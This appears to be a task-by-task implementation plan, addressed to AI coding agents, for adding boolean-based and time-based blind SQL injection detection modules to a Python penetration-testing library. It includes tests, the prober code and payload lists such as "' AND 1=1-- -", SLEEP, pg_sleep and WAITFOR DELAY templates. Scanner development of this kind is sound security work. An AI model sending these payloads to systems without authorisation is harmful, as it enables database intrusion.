# Differential (Blind) SQLi Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add boolean-based and time-based blind SQLi detection via an active-prober extension to the L4c `Runner`, used purely from code (`Runner.run(attack="sqli-boolean"|"sqli-time")`).

**Architecture:** A `DifferentialModule.probe(point, request, sender, *, baseline)` interface + a duck-typed differential branch in `Runner.run` (one `Attempt` per point); two concrete modules in a new `attack/modules/differential.py`; registered by name but excluded from the four-module `BUILTIN_MODULES`.

**Tech Stack:** stdlib `asyncio`, `time`. No new dependencies. Python 3.11+.

**Spec:** `docs/superpowers/specs/2026-07-11-penpine-differential-sqli-design.md`

## Global Constraints

- Commit WITHOUT GPG signing: `git -c commit.gpgsign=false commit -m "..."` (`-c` BEFORE `commit`).
- Gates LIVE: before each commit run `ruff check <files> && ruff format <files>` (line-length 100; ruleset E,F,W,I,UP,B,C4,SIM) and `python -m pytest`.
- Async tests use `asyncio_mode = "auto"` — `async def test_...`, no `@pytest.mark.asyncio`.
- Library-only: NO changes to `penpine/cli/`. No new runtime dependencies.
- Time-based must be deterministic in tests via an **injectable clock** — tests must NOT sleep.
- Differential modules register by name but are NOT added to `BUILTIN_MODULES` (the four signature modules).
- Do NOT run `git add -A`; stage only the files named per task. Leave `.superpowers/` alone.
- Baseline suite is `383 passed, 1 skipped`; new tests add to it, nothing regresses.

Verified existing facts:
- `Runner.run(request, *, attack=None, module=None, test_cases=None, points=None, validator=None, sender=None)`; it computes `module = self._resolve_module(attack, module)`, `attack_type = attack or (module.name if module else None)`, captures a baseline via `active_sender.send(request)` (swallowed to None), and runs attempts under `asyncio.Semaphore(self._max_concurrency)`. `self._select_points(request, module, attack_type, points)` returns points (uses `analyze(request).for_attack(attack_type)` filtered by `module.applies(kind)`, or `points` if given).
- `Attempt(test_case, request=None, response=None, finding=None, error=None, elapsed_ms=None)`; `Report(request, attack_type, baseline, attempts)`; `Report.findings`/`.summary()`.
- `InjectionPoint(expr, kind, name, value, attack_types)`; `Payload(value, technique="", meta={})`; `TestCase(point, payload, attack_type, request=None, marker=None, meta={})`; `Finding(attack_type, point, payload, confidence, evidence, request=None, response=None, meta={})`; `Confidence.HIGH`.
- `Request.replace_at(expr, value) -> Request`; `Response.status_code`; `Response.body.raw` (bytes).
- `registry.register(module, *, replace=False)` (stores by `module.name`, duck-typed); `registry.get(name)`.
- `penpine/attack/modules/__init__.py` has `BUILTIN_MODULES = [SQLI_MODULE, XSS_MODULE, TRAVERSAL_MODULE, REDIRECT_MODULE]` and `register_builtins(*, replace=True)`.
- `parse_response(bytes)` from `penpine.core.parse.http_parser`; `Request.from_url(url)` sets meta.

---

### Task 1: Runner differential branch

**Files:**
- Modify: `penpine/attack/runner.py`
- Test: `tests/attack/test_runner_differential.py`

**Interfaces:**
- Produces: `Runner.run` routes any module exposing `probe` through `Runner._probe_attempt(request, point, module, baseline, sender)` (one `Attempt` per selected point). A differential module is any object with `name`, `applies(kind)`, optional `select_attack_type`, and `async probe(point, request, sender, *, baseline=None) -> Finding | None`.

- [ ] **Step 1: Write the failing test** — `tests/attack/test_runner_differential.py`:
```python
from penpine.attack.models import Confidence, Finding, InjectionPoint, Payload
from penpine.attack.runner import Runner
from penpine.core.message import Request


class _FakeDiff:
    name = "sqli-boolean"
    applies_to = ("param",)
    select_attack_type = "sqli"

    def __init__(self, behavior):
        self._behavior = behavior  # callable(point) -> Finding | None | raises

    def applies(self, kind):
        return not self.applies_to or kind in self.applies_to

    async def probe(self, point, request, sender, *, baseline=None):
        return self._behavior(point)


def _finding(point):
    return Finding(
        attack_type="sqli-boolean",
        point=point,
        payload=Payload("' AND 1=1-- -"),
        confidence=Confidence.HIGH,
        evidence="boolean-based blind SQLi",
    )


async def test_runner_probes_each_point_and_collects_findings():
    module = _FakeDiff(_finding)
    req = Request.from_url("http://h/s?q=hi")
    report = await Runner(capture_baseline=False).run(req, module=module, sender=_NullSender())
    assert len(report.findings) >= 1
    assert report.attack_type == "sqli-boolean"
    assert all(a.test_case.point.kind == "param" for a in report.attempts)


async def test_runner_probe_none_yields_no_findings():
    report = await Runner(capture_baseline=False).run(
        Request.from_url("http://h/s?q=hi"), module=_FakeDiff(lambda p: None), sender=_NullSender()
    )
    assert report.findings == []
    assert len(report.attempts) >= 1


async def test_runner_probe_error_isolated():
    def boom(point):
        raise RuntimeError("probe failed")

    report = await Runner(capture_baseline=False).run(
        Request.from_url("http://h/s?q=hi&x=1"), module=_FakeDiff(boom), sender=_NullSender()
    )
    assert report.summary()["failed"] == len(report.attempts)
    assert report.findings == []


class _NullSender:
    async def send(self, request):
        from penpine.core.parse.http_parser import parse_response

        return parse_response(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
```

- [ ] **Step 2: Run to confirm fail** — `python -m pytest tests/attack/test_runner_differential.py -q` → fails (the runner tries the signature path: `module.generate` doesn't exist / no findings from a probe module).

- [ ] **Step 3: Edit `penpine/attack/runner.py`.** In `run`, immediately AFTER the lines
```python
        active_sender = sender if sender is not None else self._sender
        module = self._resolve_module(attack, module)
        attack_type = attack if attack is not None else (module.name if module else None)
```
insert a differential branch BEFORE the `if validator is None and module is not None:` line:
```python
        if module is not None and hasattr(module, "probe"):
            selection_tag = attack or getattr(module, "select_attack_type", None) or module.name
            selected = self._select_points(request, module, selection_tag, points)
            baseline = None
            if self._capture_baseline:
                try:
                    baseline = await active_sender.send(request)
                except Exception:
                    baseline = None
            semaphore = asyncio.Semaphore(self._max_concurrency)

            async def _bounded_probe(point):
                async with semaphore:
                    return await self._probe_attempt(
                        request, point, module, baseline, active_sender
                    )

            attempts = list(await asyncio.gather(*(_bounded_probe(p) for p in selected)))
            return Report(
                request=request, attack_type=attack_type, baseline=baseline, attempts=attempts
            )
```
Then add the `_probe_attempt` method immediately after the existing `_attempt` method:
```python
    async def _probe_attempt(self, request, point, module, baseline, sender):
        placeholder = TestCase(
            point=point, payload=Payload("<differential>"), attack_type=module.name
        )
        try:
            finding = await module.probe(point, request, sender, baseline=baseline)
        except Exception as exc:
            return Attempt(test_case=placeholder, error=exc)
        return Attempt(
            test_case=placeholder,
            request=getattr(finding, "request", None),
            response=getattr(finding, "response", None),
            finding=finding,
        )
```
Add the needed imports to `runner.py`'s import block (keep it ruff-sorted):
```python
from penpine.attack.models import Payload, TestCase
```

- [ ] **Step 4: Run to confirm pass** — `python -m pytest tests/attack/test_runner_differential.py -q` → all pass.

- [ ] **Step 5: Full transport/attack sanity + gates + commit.**
```bash
python -m pytest tests/attack -q          # existing signature-path tests stay green
ruff check penpine/attack/runner.py tests/attack/test_runner_differential.py && ruff format penpine/attack/runner.py tests/attack/test_runner_differential.py
git add penpine/attack/runner.py tests/attack/test_runner_differential.py
git -c commit.gpgsign=false commit -m "feat(attack): add differential-prober branch to the Runner"
```

---

### Task 2: `_similar` + `BooleanSqliModule`

**Files:**
- Create: `penpine/attack/modules/differential.py`
- Test: `tests/attack/modules/test_boolean_sqli.py`

**Interfaces:**
- Produces: `DifferentialModule` (base), `_similar(a, b, *, tolerance)`, `BooleanSqliModule`, `BOOLEAN_PAYLOAD_PAIRS`, and the instance `BOOLEAN_SQLI_MODULE`. Task 4 imports these.

- [ ] **Step 1: Write the failing test** — `tests/attack/modules/test_boolean_sqli.py`:
```python
from penpine.attack.models import Confidence, InjectionPoint
from penpine.attack.modules.differential import (
    BOOLEAN_SQLI_MODULE,
    BooleanSqliModule,
    _similar,
)
from penpine.core.message import Request
from penpine.core.parse.http_parser import parse_response


def _resp(status, body):
    return parse_response(b"HTTP/1.1 %d X\r\nContent-Length: %d\r\n\r\n%s" % (status, len(body), body))


def test_similar_status_and_length():
    a = _resp(200, b"hello world")
    b = _resp(200, b"hello worlx")  # same length, same status
    assert _similar(a, b, tolerance=0) is True
    assert _similar(a, _resp(404, b"hello world"), tolerance=0) is False
    assert _similar(a, _resp(200, b"short"), tolerance=2) is False
    assert _similar(a, None, tolerance=0) is False


class _BoolSender:
    """TRUE payloads render like the baseline; FALSE payloads differ."""

    def __init__(self):
        self.base = _resp(200, b"A" * 500)

    async def send(self, request):
        raw = request.serialize()
        if b"1%3D2" in raw or b"1'%3D'2" in raw or b"1=2" in raw:  # FALSE condition
            return _resp(200, b"B" * 50)
        return self.base  # baseline + TRUE condition


async def test_boolean_module_flags_injectable_point():
    module = BooleanSqliModule()
    point = InjectionPoint(expr="param:q", kind="param", name="q", value="hi")
    req = Request.from_url("http://h/s?q=hi")
    finding = await module.probe(point, req, _BoolSender())
    assert finding is not None
    assert finding.attack_type == "sqli-boolean"
    assert finding.confidence == Confidence.HIGH
    assert finding.response is not None


class _StaticSender:
    async def send(self, request):
        return _resp(200, b"same for everything")


async def test_boolean_module_no_finding_when_uniform():
    module = BooleanSqliModule()
    point = InjectionPoint(expr="param:q", kind="param", name="q", value="hi")
    finding = await module.probe(point, Request.from_url("http://h/s?q=hi"), _StaticSender())
    assert finding is None


def test_module_metadata():
    assert BOOLEAN_SQLI_MODULE.name == "sqli-boolean"
    assert BOOLEAN_SQLI_MODULE.select_attack_type == "sqli"
    assert BOOLEAN_SQLI_MODULE.applies("param") is True
    assert BOOLEAN_SQLI_MODULE.applies("header") is False
```

- [ ] **Step 2: Run to confirm fail** — `python -m pytest tests/attack/modules/test_boolean_sqli.py -q` → `ModuleNotFoundError: No module named 'penpine.attack.modules.differential'`.

- [ ] **Step 3: Create `penpine/attack/modules/differential.py`:**
```python
"""Differential (blind) SQLi: boolean-based and time-based prober modules."""

from __future__ import annotations

import time

from penpine.attack.models import Confidence, Finding, Payload

_SQLI_KINDS = ("param", "form", "json", "multipart", "cookie")


class DifferentialModule:
    """An active prober: drives its own sends and returns a Finding or None."""

    name = "differential"
    applies_to: tuple = ()
    select_attack_type: str | None = None

    def applies(self, kind: str) -> bool:
        return not self.applies_to or kind in self.applies_to

    async def probe(self, point, request, sender, *, baseline=None):
        raise NotImplementedError


def _similar(a, b, *, tolerance) -> bool:
    if a is None or b is None:
        return False
    if a.status_code != b.status_code:
        return False
    return abs(len(a.body.raw) - len(b.body.raw)) <= tolerance


BOOLEAN_PAYLOAD_PAIRS = [
    ("' AND 1=1-- -", "' AND 1=2-- -"),
    ("' AND '1'='1", "' AND '1'='2"),
    (" AND 1=1", " AND 1=2"),
    (") AND 1=1-- -", ") AND 1=2-- -"),
]


class BooleanSqliModule(DifferentialModule):
    name = "sqli-boolean"
    select_attack_type = "sqli"
    applies_to = _SQLI_KINDS

    def __init__(self, pairs=None):
        self.pairs = list(pairs) if pairs is not None else list(BOOLEAN_PAYLOAD_PAIRS)

    async def probe(self, point, request, sender, *, baseline=None):
        base = baseline if baseline is not None else await sender.send(request)
        tolerance = max(32, len(base.body.raw) // 20)
        for true_payload, false_payload in self.pairs:
            rt = await sender.send(request.replace_at(point.expr, true_payload))
            rf = await sender.send(request.replace_at(point.expr, false_payload))
            if _similar(rt, base, tolerance=tolerance) and not _similar(
                rf, base, tolerance=tolerance
            ):
                return Finding(
                    attack_type="sqli-boolean",
                    point=point,
                    payload=Payload(true_payload, technique="boolean-blind"),
                    confidence=Confidence.HIGH,
                    evidence=(
                        f"boolean-based blind SQLi: TRUE ({true_payload!r}) matched baseline, "
                        f"FALSE ({false_payload!r}) differed"
                    ),
                    request=request.replace_at(point.expr, true_payload),
                    response=rt,
                )
        return None


BOOLEAN_SQLI_MODULE = BooleanSqliModule()
```

- [ ] **Step 4: Run to confirm pass** — `python -m pytest tests/attack/modules/test_boolean_sqli.py -q` → all pass. (Note: `Request.from_url("http://h/s?q=hi").replace_at("param:q", "' AND 1=2-- -")` URL-encodes `=` to `%3D`; the `_BoolSender` matches `b"1=2"` OR the encoded forms, so it recognizes the FALSE condition either way.)

- [ ] **Step 5: Lint, format, commit.**
```bash
ruff check penpine/attack/modules/differential.py tests/attack/modules/test_boolean_sqli.py && ruff format penpine/attack/modules/differential.py tests/attack/modules/test_boolean_sqli.py
git add penpine/attack/modules/differential.py tests/attack/modules/test_boolean_sqli.py
git -c commit.gpgsign=false commit -m "feat(attack): add boolean-based blind SQLi module and _similar"
```

---

### Task 3: `TimeSqliModule`

**Files:**
- Modify: `penpine/attack/modules/differential.py` (append)
- Test: `tests/attack/modules/test_time_sqli.py`

**Interfaces:**
- Consumes: `DifferentialModule`, `Finding`, `Payload`, `Confidence` (Task 2).
- Produces: `TimeSqliModule(*, templates=None, delay=3, threshold=0.8, clock=time.perf_counter)`, `TIME_PAYLOAD_TEMPLATES`, and the instance `TIME_SQLI_MODULE`.

- [ ] **Step 1: Write the failing test** — `tests/attack/modules/test_time_sqli.py`:
```python
from penpine.attack.models import Confidence, InjectionPoint
from penpine.attack.modules.differential import TIME_SQLI_MODULE, TimeSqliModule
from penpine.core.message import Request
from penpine.core.parse.http_parser import parse_response


def _ok():
    return parse_response(b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")


class _Clock:
    def __init__(self):
        self.t = 0.0

    def __call__(self):
        return self.t

    def advance(self, dt):
        self.t += dt


class _TimingSender:
    """Advances a shared clock: a sleep payload asking for N=3 delays ~delay; the
    N=0 control and un-injected baseline are instant.

    `replace_at` URL-encodes the query value, so `SLEEP(3)` becomes `SLEEP%283%29`
    and `WAITFOR DELAY '0:0:3'` becomes `...0%3A0%3A3...`; we key on the delay
    VALUE (3) in both encoded and raw forms so the N=0 control never matches.
    """

    def __init__(self, clock, *, injectable, delay=3.0):
        self.clock = clock
        self.injectable = injectable
        self.delay = delay

    async def send(self, request):
        raw = request.serialize()
        delays = self.injectable and (
            b"%283%29" in raw or b"(3)" in raw or b"0%3A0%3A3" in raw or b"0:0:3" in raw
        )
        self.clock.advance((self.delay + 0.05) if delays else 0.001)
        return _ok()


async def test_time_module_flags_confirmed_delay():
    clock = _Clock()
    module = TimeSqliModule(delay=3, clock=clock)
    sender = _TimingSender(clock, injectable=True)
    point = InjectionPoint(expr="param:q", kind="param", name="q", value="1")
    finding = await module.probe(point, Request.from_url("http://h/s?q=1"), sender)
    assert finding is not None
    assert finding.attack_type == "sqli-time"
    assert finding.confidence == Confidence.HIGH


async def test_time_module_no_finding_when_not_injectable():
    clock = _Clock()
    module = TimeSqliModule(delay=3, clock=clock)
    sender = _TimingSender(clock, injectable=False)  # nothing ever delays
    point = InjectionPoint(expr="param:q", kind="param", name="q", value="1")
    finding = await module.probe(point, Request.from_url("http://h/s?q=1"), sender)
    assert finding is None


class _UniformlySlowSender:
    """Everything is slow — including the zero-delay control — so it is NOT injectable."""

    def __init__(self, clock, delay=3.0):
        self.clock = clock
        self.delay = delay

    async def send(self, request):
        self.clock.advance(self.delay + 0.05)
        return _ok()


async def test_time_module_no_finding_when_uniformly_slow():
    clock = _Clock()
    module = TimeSqliModule(delay=3, clock=clock)
    finding = await module.probe(
        InjectionPoint(expr="param:q", kind="param", name="q", value="1"),
        Request.from_url("http://h/s?q=1"),
        _UniformlySlowSender(clock),
    )
    assert finding is None


def test_time_module_metadata():
    assert TIME_SQLI_MODULE.name == "sqli-time"
    assert TIME_SQLI_MODULE.select_attack_type == "sqli"
    assert TIME_SQLI_MODULE.applies("param") is True
```

- [ ] **Step 2: Run to confirm fail** — `python -m pytest tests/attack/modules/test_time_sqli.py -q` → `ImportError: cannot import name 'TIME_SQLI_MODULE'`.

- [ ] **Step 3: Append to `penpine/attack/modules/differential.py`:**
```python
TIME_PAYLOAD_TEMPLATES = [
    "' AND SLEEP({n})-- -",
    " AND SLEEP({n})",
    "' AND (SELECT 1 FROM (SELECT SLEEP({n}))x)-- -",
    "' AND pg_sleep({n})-- -",
    "';SELECT pg_sleep({n})-- -",
    "'; WAITFOR DELAY '0:0:{n}'-- -",
    " WAITFOR DELAY '0:0:{n}'",
]


class TimeSqliModule(DifferentialModule):
    name = "sqli-time"
    select_attack_type = "sqli"
    applies_to = _SQLI_KINDS

    def __init__(self, *, templates=None, delay=3, threshold=0.8, clock=time.perf_counter):
        self.templates = list(templates) if templates is not None else list(TIME_PAYLOAD_TEMPLATES)
        self.delay = delay
        self.threshold = threshold
        self._clock = clock

    async def _timed(self, sender, req):
        start = self._clock()
        resp = await sender.send(req)
        return self._clock() - start, resp

    async def probe(self, point, request, sender, *, baseline=None):
        margin = self.delay * self.threshold
        b1, _ = await self._timed(sender, request)
        b2, _ = await self._timed(sender, request)
        base_lat = min(b1, b2)
        for template in self.templates:
            payload = template.format(n=self.delay)
            t1, resp = await self._timed(sender, request.replace_at(point.expr, payload))
            if t1 - base_lat < margin:
                continue
            t2, _ = await self._timed(sender, request.replace_at(point.expr, payload))
            control = template.format(n=0)
            tc, _ = await self._timed(sender, request.replace_at(point.expr, control))
            if t2 - base_lat >= margin and tc - base_lat < margin:
                return Finding(
                    attack_type="sqli-time",
                    point=point,
                    payload=Payload(payload, technique="time-blind"),
                    confidence=Confidence.HIGH,
                    evidence=(
                        f"time-based blind SQLi: {payload!r} delayed ~{t1 - base_lat:.1f}s "
                        f"(confirmed {t2 - base_lat:.1f}s), control fast"
                    ),
                    request=request.replace_at(point.expr, payload),
                    response=resp,
                )
        return None


TIME_SQLI_MODULE = TimeSqliModule()
```

- [ ] **Step 4: Run to confirm pass** — `python -m pytest tests/attack/modules/test_time_sqli.py -q` → all pass.

- [ ] **Step 5: Lint, format, commit.**
```bash
ruff check penpine/attack/modules/differential.py tests/attack/modules/test_time_sqli.py && ruff format penpine/attack/modules/differential.py tests/attack/modules/test_time_sqli.py
git add penpine/attack/modules/differential.py tests/attack/modules/test_time_sqli.py
git -c commit.gpgsign=false commit -m "feat(attack): add time-based blind SQLi module with injectable clock"
```

---

### Task 4: Registration + end-to-end via the Runner

**Files:**
- Modify: `penpine/attack/modules/__init__.py`
- Test: `tests/attack/modules/test_differential_registration.py`

**Interfaces:**
- Consumes: `BOOLEAN_SQLI_MODULE`, `TIME_SQLI_MODULE`, and the module classes/constants from `differential` (Tasks 2–3); the Runner differential branch (Task 1).

- [ ] **Step 1: Write the failing test** — `tests/attack/modules/test_differential_registration.py`:
```python
from penpine.attack import registry
from penpine.attack.modules import BUILTIN_MODULES, DIFFERENTIAL_MODULES, register_builtins
from penpine.attack.runner import Runner
from penpine.core.message import Request
from penpine.core.parse.http_parser import parse_response


def test_register_builtins_registers_differential_by_name():
    register_builtins()
    assert registry.get("sqli-boolean").name == "sqli-boolean"
    assert registry.get("sqli-time").name == "sqli-time"


def test_differential_excluded_from_builtin_modules():
    names = {m.name for m in BUILTIN_MODULES}
    assert "sqli-boolean" not in names
    assert "sqli-time" not in names
    assert {m.name for m in DIFFERENTIAL_MODULES} == {"sqli-boolean", "sqli-time"}


def _resp(status, body):
    return parse_response(b"HTTP/1.1 %d X\r\nContent-Length: %d\r\n\r\n%s" % (status, len(body), body))


class _BoolSender:
    def __init__(self):
        self.base = _resp(200, b"A" * 500)

    async def send(self, request):
        raw = request.serialize()
        if b"1%3D2" in raw or b"1=2" in raw or b"'1'%3D'2" in raw:
            return _resp(200, b"B" * 50)
        return self.base


async def test_end_to_end_boolean_via_runner():
    register_builtins()
    req = Request.from_url("http://h/s?q=hi")
    report = await Runner(sender=_BoolSender(), capture_baseline=False).run(req, attack="sqli-boolean")
    assert any(f.attack_type == "sqli-boolean" for f in report.findings)
    assert any(a.test_case.point.expr == "param:q" for a in report.attempts)
```

- [ ] **Step 2: Run to confirm fail** — `python -m pytest tests/attack/modules/test_differential_registration.py -q` → `ImportError` (`DIFFERENTIAL_MODULES` not exported).

- [ ] **Step 3: Edit `penpine/attack/modules/__init__.py`.** Add an import block for the differential module and constants (place with the other module imports, ruff-sorted):
```python
from penpine.attack.modules.differential import (
    BOOLEAN_PAYLOAD_PAIRS,
    BOOLEAN_SQLI_MODULE,
    TIME_PAYLOAD_TEMPLATES,
    TIME_SQLI_MODULE,
    BooleanSqliModule,
    DifferentialModule,
    TimeSqliModule,
)
```
Add `DIFFERENTIAL_MODULES` after the existing `BUILTIN_MODULES = [...]` line:
```python
DIFFERENTIAL_MODULES = [BOOLEAN_SQLI_MODULE, TIME_SQLI_MODULE]
```
Change `register_builtins` to register both lists:
```python
def register_builtins(*, replace=True) -> None:
    """Register all built-in attack modules into the global registry (idempotent)."""
    for module in (*BUILTIN_MODULES, *DIFFERENTIAL_MODULES):
        register(module, replace=replace)
```
Add the new names to `__all__` (append these entries): `"DifferentialModule"`, `"BooleanSqliModule"`, `"TimeSqliModule"`, `"BOOLEAN_SQLI_MODULE"`, `"TIME_SQLI_MODULE"`, `"DIFFERENTIAL_MODULES"`, `"BOOLEAN_PAYLOAD_PAIRS"`, `"TIME_PAYLOAD_TEMPLATES"`.

- [ ] **Step 4: Run to confirm pass** — `python -m pytest tests/attack/modules/test_differential_registration.py -q` → all pass.

- [ ] **Step 5: Full suite + gates, then commit.**
```bash
python -m pytest -q          # expect 383 baseline + new differential tests, 1 skipped, no regressions
ruff check . && ruff format --check .
git add penpine/attack/modules/__init__.py tests/attack/modules/test_differential_registration.py
git -c commit.gpgsign=false commit -m "feat(attack): register differential SQLi modules (excluded from BUILTIN_MODULES)"
```

---

### Final verification (after all tasks)

- [ ] `ruff check . && ruff format --check . && python -m pytest -q` → gates clean; suite green (383 baseline + ~15 new differential tests, 1 skipped).
- [ ] Library smoke: `python -c "import asyncio; from penpine.attack.modules import register_builtins; from penpine.attack import registry; register_builtins(); print(registry.get('sqli-boolean').name, registry.get('sqli-time').name)"` prints `sqli-boolean sqli-time`.

---

## Self-Review

**Spec coverage:**
- §4 prober interface + Runner branch (duck-typed `probe`, `select_attack_type`, one Attempt/point, error isolation) → Task 1 + tests. ✓
- §5 `_similar` → Task 2 + `test_similar_status_and_length`. ✓
- §6 `BooleanSqliModule` (three-way, payload pairs, metadata) → Task 2 + boolean tests. ✓
- §7 `TimeSqliModule` (baseline→delayed→confirm→control, injectable clock, templates, delay/threshold) → Task 3 + time tests. ✓
- §8 registration (`DIFFERENTIAL_MODULES`, register both, exclude from `BUILTIN_MODULES`, exports) → Task 4 + registration/e2e tests. ✓
- §9 errors (probe error → Attempt.error) → Task 1 `test_runner_probe_error_isolated`. ✓
- §10 testing (runner branch, _similar, boolean, time, registration, end-to-end) → Tasks 1–4. ✓

**Placeholder scan:** No TBD/TODO; every code step is complete. The Runner edit specifies the exact insertion point (after the three named lines, before the `validator is None` line) and the exact `_probe_attempt` body. ✓

**Type/name consistency:** `DifferentialModule`/`BooleanSqliModule`/`TimeSqliModule`/`_similar`/`BOOLEAN_SQLI_MODULE`/`TIME_SQLI_MODULE`/`DIFFERENTIAL_MODULES` defined in Tasks 2–3 are imported/registered in Task 4 with matching names; the Runner (Task 1) calls `module.probe(point, request, sender, baseline=baseline)` and `getattr(module, "select_attack_type", None)`, matching the module attributes; `Finding(attack_type, point, payload, confidence, evidence, request, response)` and `Payload(value, technique=)` match the verified L4a signatures; `request.replace_at(point.expr, value)` and `response.status_code`/`response.body.raw` match L0. ✓
